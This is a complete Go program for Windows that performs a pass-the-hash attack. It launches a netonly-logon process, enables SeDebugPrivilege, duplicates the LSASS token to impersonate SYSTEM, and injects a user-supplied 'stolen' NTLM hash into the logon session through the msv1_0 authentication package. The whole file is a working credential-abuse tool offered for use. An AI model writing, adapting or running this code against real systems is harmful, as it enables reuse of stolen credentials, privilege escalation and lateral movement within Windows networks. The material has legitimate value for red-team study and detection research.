package main

import (
	"encoding/hex"
	"fmt"
	"runtime"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type MyTokenStatistics struct {
	TokenId            windows.LUID
	AuthenticationId   windows.LUID
	ExpirationTime     windows.Filetime
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         windows.LUID
}

type LSA_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type MSV1_0_PASSTHEHASH_REQUEST struct {
	MessageType      uint32
	LogonId          windows.LUID
	AuthenticationId windows.LUID
	Padding          uint32
	Hash             [16]byte
}

const (
	LOGON_NETCREDENTIALS_ONLY  = 0x00000002
	Create_Unicode_Environment = 0x00000400
	TOKEN_QUERY                = 0x0008
	TOKEN_ADJUST_PRIVILEGES    = 0x0020
	SE_TCB_NAME                = "SeTcbPrivilege"
	SE_PRIVILEGE_ENABLED       = 0x00000002
	SE_DEBUG_NAME              = "SeDebugPrivilege"
	PROCESS_ALL_ACCESS         = 0x1FFFFF
)

var (
	advapi                             = syscall.NewLazyDLL("advapi32.dll")
	procCreateProcessWithLogonW        = advapi.NewProc("CreateProcessWithLogonW")
	secur32                            = syscall.NewLazyDLL("secur32.dll")
	procLsaCallAuthenticationPackage   = secur32.NewProc("LsaCallAuthenticationPackage")
	procLsaConnectUntrusted            = secur32.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthenticationPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaFreeReturnBuffer            = secur32.NewProc("procLsaFreeReturnBuffer")
	procLsaDeregisterLogonProcess      = secur32.NewProc("LsaDeregisterLogonProcess")
	kernel32                           = syscall.NewLazyDLL("kernel32.dll")
	procReadProcessMemory              = kernel32.NewProc("ReadProcessMemory")
)

func UTF16PtrFromString(s string) (*uint16, error) {
	return syscall.UTF16PtrFromString(s)
}

func CreateProcessWithLogonW(username string, password string, domain string) (*windows.ProcessInformation, error) {
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	userPtr, _ := windows.UTF16PtrFromString(username)
	domainPtr, _ := windows.UTF16PtrFromString("")
	passPtr, _ := windows.UTF16PtrFromString(password)
	cmdLinePtr, _ := windows.UTF16PtrFromString("C:\\Windows\\System32\\cmd.exe")
	r1, _, err := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		LOGON_NETCREDENTIALS_ONLY,
		uintptr(0),
		uintptr(unsafe.Pointer(cmdLinePtr)),
		0,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	runtime.KeepAlive(userPtr)
	runtime.KeepAlive(domainPtr)
	runtime.KeepAlive(passPtr)
	runtime.KeepAlive(cmdLinePtr)

	if r1 == 0 {
		return nil, err

	}
	return &pi, nil
}

func OpenProcessToken(process *windows.ProcessInformation) (*windows.Token, error) {
	var token windows.Token
	if err := windows.OpenProcessToken(
		process.Process,
		TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,
		&token,
	); err != nil {
		return nil, err
	}

	return &token, nil

}

func EnablePriv(token *windows.Token) error {
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(SE_DEBUG_NAME), &luid); err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}
	if err := windows.AdjustTokenPrivileges(*token, false, &tp, 0, nil, nil); err != nil {
		return err
	}
	if lastErr := windows.GetLastError(); lastErr != nil {
		return lastErr
	}

	return nil
}
func GetTokenInformation(token *windows.Token) (MyTokenStatistics, error) {
	var returnLength uint32
	err := windows.GetTokenInformation(*token, windows.TokenStatistics, nil, 0, &returnLength)
	if err != windows.ERROR_INSUFFICIENT_BUFFER {
		return MyTokenStatistics{}, err
	}
	returnByte := make([]byte, returnLength)
	if err := windows.GetTokenInformation(*token, windows.TokenStatistics, &returnByte[0], returnLength, &returnLength); err != nil {
		return MyTokenStatistics{}, err
	}

	return *((*MyTokenStatistics)(unsafe.Pointer(&returnByte[0]))), nil
}

func OpenLsass(pid string) (windows.Handle, error) {

	pidInt, err := strconv.Atoi(pid)
	if err != nil {
		return 0, err
	}

	pid32 := uint32(pidInt)

	lsassHandle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		pid32,
	)

	if err != nil {
		return 0, fmt.Errorf("OpenProcess failed: %v\n", err)
	}

	var tokenHandle windows.Token
	if err := windows.OpenProcessToken(lsassHandle, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &tokenHandle); err != nil {
		return 0, fmt.Errorf("Error Opening Process Token %v\n", err)
	}

	defer tokenHandle.Close()

	var phNewTokenHandle windows.Token
	if err := windows.DuplicateTokenEx(tokenHandle, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &phNewTokenHandle); err != nil {
		return 0, err
	}

	err = windows.SetThreadToken(nil, phNewTokenHandle)
	if err != nil {
		return 0, fmt.Errorf("SetThreadToken failed: %v", err)
	}

	fmt.Println("Successfully impersonated SYSTEM!")
	return lsassHandle, nil
}

func NewLsaString() LSA_STRING {
	name := "msv1_0"
	ptr, _ := syscall.BytePtrFromString(name)
	return LSA_STRING{
		Length:        uint16(len(name)),
		MaximumLength: uint16(len(name) + 1),
		Buffer:        uintptr(unsafe.Pointer(ptr)),
	}
}

func HashSwap(targetLUID windows.LUID, ntlmHash [16]byte, lsaString LSA_STRING) error {
	var LsaHandle windows.Handle

	r1, _, _ := procLsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&LsaHandle)),
	)
	if r1 != 0 {
		return fmt.Errorf("LSA ConnectUntrusted failed: 0x%x", r1)
	}
	defer windows.CloseHandle(LsaHandle)

	var packageID uint32
	r1, _, _ = procLsaLookupAuthenticationPackage.Call(
		uintptr(LsaHandle),
		uintptr(unsafe.Pointer(&lsaString)),
		uintptr(unsafe.Pointer(&packageID)),
	)

	if r1 != 0 {
		return fmt.Errorf("Lookup failed: 0x%x", r1)
	}

	pthRequest := MSV1_0_PASSTHEHASH_REQUEST{
		MessageType:      10,
		LogonId:          targetLUID,
		AuthenticationId: targetLUID,
		Hash:             ntlmHash,
	}

	var ProtocolReturnBuffer uintptr
	var returnBufferLength uint32
	var ProtocolStatus int32
	ret1, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(LsaHandle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&pthRequest)),
		uintptr(unsafe.Sizeof(pthRequest)),
		uintptr(unsafe.Pointer(&ProtocolReturnBuffer)),
		uintptr(unsafe.Pointer(&returnBufferLength)),
		uintptr(unsafe.Pointer(&ProtocolStatus)),
	)

	if ProtocolReturnBuffer != 0 {
		procLsaFreeReturnBuffer.Call(ProtocolReturnBuffer)
	}

	if ret1 != 0 || ProtocolStatus != 0 {
		return fmt.Errorf("Call failed. NTSTATUS: 0x%x, ProtocolStatus: 0x%x", ret1, ProtocolStatus)
	}

	return nil
}

func StringTo16Bytes(s string) [16]byte {
	var arr [16]byte

	decoded, err := hex.DecodeString(s)
	if err != nil || len(decoded) != 16 {
		fmt.Println("Error: Hash must be exactly 32 hex characters.")
		return arr
	}
	copy(arr[:], decoded)
	return arr
}

func main() {
	var username string
	var password string
	var domain string
	var lsassPid string
	var hash string

	fmt.Print("Enter Username: ")
	if _, err := fmt.Scanln(&username); err != nil {
		fmt.Println("Invalid input for name: ", err)
		return
	}

	fmt.Printf("Enter Password: ")
	if _, err := fmt.Scanln(&password); err != nil {
		fmt.Println("Invalid Password: ", err)
		return
	}

	fmt.Print("Enter Domain: ")
	if _, err := fmt.Scanln(&domain); err != nil {
		fmt.Println("Invalid input for name: ", err)
		return
	}

	fmt.Printf("Enter LsassPID: ")
	if _, err := fmt.Scanln(&lsassPid); err != nil {
		fmt.Println("Invalid input for PID: ", err)
		return
	}

	fmt.Printf("Enter Stolen Hash: ")
	if _, err := fmt.Scanln(&hash); err != nil {
		fmt.Println("Invalid Hash Entry: ")
		return
	}

	hashByte := StringTo16Bytes(hash)

	ProcessInfo, err := CreateProcessWithLogonW(username, password, domain)
	if err != nil {
		return
	}
	defer syscall.CloseHandle(syscall.Handle(ProcessInfo.Process))
	defer syscall.CloseHandle(syscall.Handle(ProcessInfo.Thread))

	fmt.Printf("New Process PID: %v\n", ProcessInfo.ProcessId)

	Token, err := OpenProcessToken(ProcessInfo)
	if err != nil {
		return
	}

	err = EnablePriv(Token)
	if err != nil {
		fmt.Print("Did Not Get God Mode")
		return
	}
	fmt.Println("Got God Mode")
	TokenStats, err := GetTokenInformation(Token)
	if err != nil {
		return
	}

	fmt.Printf("Token LUID: %v\n", TokenStats.AuthenticationId)

	lsassHandle, err := OpenLsass(lsassPid)
	if err != nil {
		fmt.Println("Unable to Get Handle to LSASS")
	}
	defer windows.CloseHandle(lsassHandle)
	fmt.Println(lsassHandle)

	lsastring := NewLsaString()
	err = HashSwap(TokenStats.AuthenticationId, hashByte, lsastring)
	if err != nil {
		fmt.Printf("HashSwap failed: %v\n", err)
	} else {
		fmt.Println("Success! Hash injected.")
	}
}
